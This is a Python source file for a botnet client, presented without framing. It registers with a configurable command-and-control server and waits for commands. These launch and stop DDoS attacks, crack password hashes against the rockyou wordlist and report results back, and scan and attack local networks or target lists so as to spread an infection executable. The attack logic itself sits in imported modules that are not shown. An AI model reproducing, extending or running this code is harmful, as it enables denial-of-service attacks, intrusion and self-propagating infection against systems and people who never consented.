#!/usr/bin/python

import socket
import threading
import time
import hashlib
import local_network_attack
import attack_list
import DDOSAttack


#confugure
cnc_ip = "your cnc ip"
cnc_port = 8080 #your cnc ip port, default is 8080
executable = "executable to infect with"
##############################################################
global cracking_processes
cracking = False
global id_num
id_num = '0'
global local_attack
local_attack = False
global local_attack_var
local_attack_var = None
global list_attack_var
list_attack_var = None
global ddos_var
ddos_var = None

####### utils: ############################

def get_public_ip(): #gets the public ip
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                 
	s.connect(("ifconfig.me" , 80))
	s.sendall("GET / HTTP/1.1\r\nHost: ifconfig.me\r\n\r\n")
	data = s.recv(4096)
	ip = data.split('\n')
	ip = ip[len(ip)-1]
	s.close()
	return ip

############ bot command functions ####################

def ddos(message,conn,addr): #starts ddos attack
	target = message.split(" ")[1]
	print("ddos %s" %target)
	global ddos_var
	if ddos_var:
		pass
	else:
		print("ddos started %s" %target)
		ddos_var = DDOSAttack
		ddos_var.attack(target)		

def stop_ddos(message,conn,addr): #stops ddos attack
	if ddos_var:
		ddos_var.stop()
	print("try ddos stopped")

def send_message(msg,cnc_ip,cnc_port): #sends message to cnc
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((cnc_ip, int(cnc_port)))
	sock.send(msg.encode())
	sock.close()

def crack(message,conn,addr): #starts hash cracking
	with open("rockyou.txt","r") as f:
		lines = f.readlines()
	index1 = int(message.split(" ")[3])
	index2 = int(message.split(" ")[4])
	hash_str = message.split(" ")[1]
	hash_type = message.split(" ")[2]
	print(index1, index2,hash_str,hash_type)
	for i in range(index1,index2):
		global cracking
		if not cracking:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((cnc_ip, cnc_port))
			msg = "crack stopped %s" % (hash_str)
			sock.send(msg.encode())
			sock.close()
			return
		word = lines[i][:-1]
		m = hashlib.new(hash_type)
		m.update(word)
		if (m.hexdigest() == hash_str):
			print("cracked: %s %s on the %s attempt" % (hash_str,word,i))
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((cnc_ip, cnc_port))
			msg = "cracked %s %s" % (hash_str,word)
			sock.send(msg.encode())
			sock.close()
			return
	print("fail")
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((cnc_ip, cnc_port))
	msg = "crack failed %s" % (hash_str)
	sock.send(msg.encode())
	sock.close()
	return

############### client settings ######################

def infected(port): #sends cnc infection message
	global id_num
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((cnc_ip, cnc_port))
	msg = "infected: " + str(port)
	sock.send(msg.encode())
	data = sock.recv(8000)
	id_num = data.decode('utf-8').strip('\r\n')
	print("my id is: %s" % id_num)
	sock.close()

def pong(conn,addr):
	conn.send("pong".encode())
	conn.close()

def on_message(message,conn,addr): #handels incoming message
	global id_num
	global cracking
	global local_attack
	global local_attack_var
	global list_attack_var
	message = str(message.encode('ascii', 'ignore'))
	print("got message",message)
	if "scan" in message:
		scan(message,conn,addr)
	elif 'stop ddos' in message:
		stop_ddos(message,conn,addr)
	elif 'ddos' in message:
		ddos(message,conn,addr)
	elif "ping" in message:
		pong(conn,addr)
	elif "stop crack" in message:
		cracking = False
	elif "crack" in message:
		cracking = True
		crack(message,conn,addr)
	elif "stop local attack" in message:
		local_attack = False
		print("try to stop me! %s" % (local_attack_var))
		if local_attack_var:
			local_attack_var.stop()
			local_attack_var = None
	elif "local attack" in message:
		if local_attack_var:
			pass
		else:
			local_attack = True
			local_attack_var = local_network_attack
		local_attack_var.scan_and_attack(cnc_ip,cnc_port,executable,False,False,id_num)
	elif "stop list attack" in message:
		list_attack = False
		print("try to stop me! %s" % (list_attack_var))
		if list_attack_var:
			list_attack_var.stop()
			list_attack_var = None
	elif "list attack" in message:
		if list_attack_var:
			pass
		else:
			list_attack = True
			list_attack_var = attack_list
		lst = message.split(" ")[2]
		if ',' in lst:
			lst = lst.split(",")
			list_attack_var.attack_list(lst,cnc_ip,cnc_port,executable,False,False,id_num)
		else:
			new = []
			new.append(lst)
			list_attack_var.attack_list(new,cnc_ip,cnc_port,executable,False,False,id_num)
		
def listen(): #starts bot server
	serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serv.bind(('0.0.0.0', 0))
	serv.listen(5)
	port = serv.getsockname()[1]
	ip = serv.getsockname()[0]
	print("started server on %s %s" % (ip,port))
	infected(port)
	while True:
		conn, addr = serv.accept()
		data = conn.recv(1024)
		if not data: 
			break
		msg = data.decode('utf-8').strip('\r\n')
		x = threading.Thread(target=on_message, args=(msg,conn,addr))
		x.setDaemon(True)
		x.start()

listen()
